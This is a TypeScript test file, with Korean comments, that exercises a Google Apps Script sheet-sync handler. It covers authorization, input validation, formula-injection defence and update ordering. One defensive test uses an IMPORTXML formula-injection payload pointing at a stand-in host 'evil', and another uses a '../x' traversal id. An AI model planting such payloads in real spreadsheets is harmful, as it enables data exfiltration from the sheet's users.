import vm from "node:vm";
import { beforeEach, describe, expect, it } from "vitest";
import { appsScriptCodeFor } from "@/lib/appsScriptCode";
import { deletePayload, replaceAllPayload, upsertPayload, type SheetPayload } from "@/lib/sheets";
import { makeTask } from "./fixtures";

/**
 * apps-script/Code.gs 를 가짜 구글 서비스 위에서 실제로 돌린다.
 * 가짜 시트는 구글시트처럼 ' 로 시작하는 값은 텍스트(앞 ' 제거), = 로 시작하는 값은 수식으로 기록한다.
 */
type Cell = string | { formula: string };

function fakeSheet() {
  const rows: Cell[][] = [];
  const toCell = (v: unknown): Cell => {
    const s = String(v);
    if (s.startsWith("'")) return s.slice(1);
    return /^[=+\-@]/.test(s) ? { formula: s } : s;
  };
  const range = (r: number, c: number, nr = 1, nc = 1) => ({
    getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => rows[r - 1 + i]?.[c - 1 + j] ?? "")),
    getValue: () => rows[r - 1]?.[c - 1] ?? "",
    setValues: (vals: unknown[][]) =>
      vals.forEach((line, i) => {
        const row = rows[r - 1 + i] ?? (rows[r - 1 + i] = []);
        line.forEach((v, j) => (row[c - 1 + j] = toCell(v)));
      }),
  });
  return {
    rows,
    getLastRow: () => rows.length,
    getRange: range,
    setFrozenRows: () => undefined,
    deleteRow: (n: number) => rows.splice(n - 1, 1),
    clearContents: () => rows.splice(0, rows.length),
  };
}

const SECRET = "b".repeat(64);

function loadScript(secret = SECRET) {
  const sheets = new Map<string, ReturnType<typeof fakeSheet>>();
  const props = new Map<string, string>();
  const ctx = vm.createContext({
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n: string) => sheets.get(n) ?? null,
        insertSheet: (n: string) => (sheets.set(n, fakeSheet()), sheets.get(n)),
      }),
    },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock: () => undefined }) },
    ContentService: { createTextOutput: (text: string) => ({ setMimeType: () => text }), MimeType: { JSON: "json" } },
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (k: string) => props.get(k) ?? null, setProperty: (k: string, v: string) => props.set(k, v) }),
    },
  });
  vm.runInContext(appsScriptCodeFor(secret), ctx);
  const post = (payload: object) =>
    JSON.parse((ctx.doPost as (e: unknown) => string)({ postData: { contents: JSON.stringify(payload) } })) as { ok: boolean; error?: string };
  const send = (p: SheetPayload, s = SECRET) => post({ ...p, secret: s });
  return { post, send, sheet: () => sheets.get("tasks") };
}

let gs: ReturnType<typeof loadScript>;
beforeEach(() => {
  gs = loadScript();
});

describe("Apps Script — 인증·형식 검증", () => {
  it("비밀값이 틀리거나 없으면 거부하고 시트를 건드리지 않는다", () => {
    const p = upsertPayload(makeTask());
    expect(gs.send(p, "wrong")).toEqual({ ok: false, error: "unauthorized" });
    expect(gs.post(p)).toEqual({ ok: false, error: "unauthorized" });
    expect(gs.post({ type: "tasks", action: "replace_all", headers: ["ID"], rows: [] })).toMatchObject({ ok: false });
    expect(gs.sheet()).toBeUndefined();
    expect(gs.send({ type: "tasks", action: "ping" })).toEqual({ ok: true });
  });
  it("비밀값을 넣지 않은 원본 코드(자리표시자)는 모두 거부", () => {
    const raw = loadScript("__SHEET_SECRET__");
    expect(raw.post({ type: "tasks", action: "ping", secret: "__SHEET_SECRET__" })).toEqual({ ok: false, error: "unauthorized" });
  });
  it("type·action·id·row 형식이 틀리면 거부", () => {
    const t = makeTask();
    const good = upsertPayload(t) as Extract<SheetPayload, { action: "upsert" }>;
    expect(gs.send({ ...good, type: "evil" })).toMatchObject({ ok: false, error: "bad type" });
    expect(gs.post({ ...good, action: "drop", secret: SECRET })).toMatchObject({ ok: false, error: "unknown action" });
    expect(gs.send({ ...good, id: "../x" })).toMatchObject({ ok: false });
    expect(gs.send({ ...good, row: { ...good.row, ID: "other" } })).toMatchObject({ ok: false });
    expect(gs.post({ ...good, row: "x", secret: SECRET })).toMatchObject({ ok: false });
    expect(gs.send({ type: "tasks", action: "delete", id: "nope", updatedAt: "t" })).toMatchObject({ ok: false });
  });
});

describe("Apps Script — 수식 주입 방어", () => {
  it("= + - @ 로 시작하는 값은 텍스트로 저장된다(수식 0개)", () => {
    const t = makeTask({ title: '=IMPORTXML("http://evil","//a")', owner: "+김", category: "@x", checklist: [] });
    expect(gs.send(upsertPayload(t))).toEqual({ ok: true });
    const rows = gs.sheet()!.rows;
    expect(rows.flat().some((c) => typeof c === "object")).toBe(false);
    expect(rows[1][2]).toBe('=IMPORTXML("http://evil","//a")');
    expect(rows[1][1]).toBe("+김");
    expect(gs.send(replaceAllPayload([makeTask({ title: "-1+1" })]))).toEqual({ ok: true });
    expect(gs.sheet()!.rows.flat().some((c) => typeof c === "object")).toBe(false);
  });
});

describe("Apps Script — 순서 역전 방지", () => {
  it("늦게 도착한 옛 수정은 무시, 새 수정은 반영", () => {
    const v1 = makeTask({ title: "v1", updatedAt: "2026-09-24T01:00:00.000Z" });
    const v2 = { ...v1, title: "v2", updatedAt: "2026-09-24T02:00:00.000Z" };
    gs.send(upsertPayload(v2));
    gs.send(upsertPayload(v1)); // 옛 것이 늦게 도착
    expect(gs.sheet()!.rows[1][2]).toBe("v2");
    expect(gs.sheet()!.rows).toHaveLength(2);
    gs.send(upsertPayload({ ...v1, title: "v3", updatedAt: "2026-09-24T03:00:00.000Z" }));
    expect(gs.sheet()!.rows[1][2]).toBe("v3");
  });
  it("삭제 뒤 늦게 도착한 수정이 행을 되살리지 않는다", () => {
    const t = makeTask({ title: "지울 카드" });
    gs.send(upsertPayload(t));
    gs.send(deletePayload(t.id, "2026-09-24T05:00:00.000Z"));
    gs.send(upsertPayload(t));
    expect(gs.sheet()!.rows).toHaveLength(1); // 헤더만
  });
});
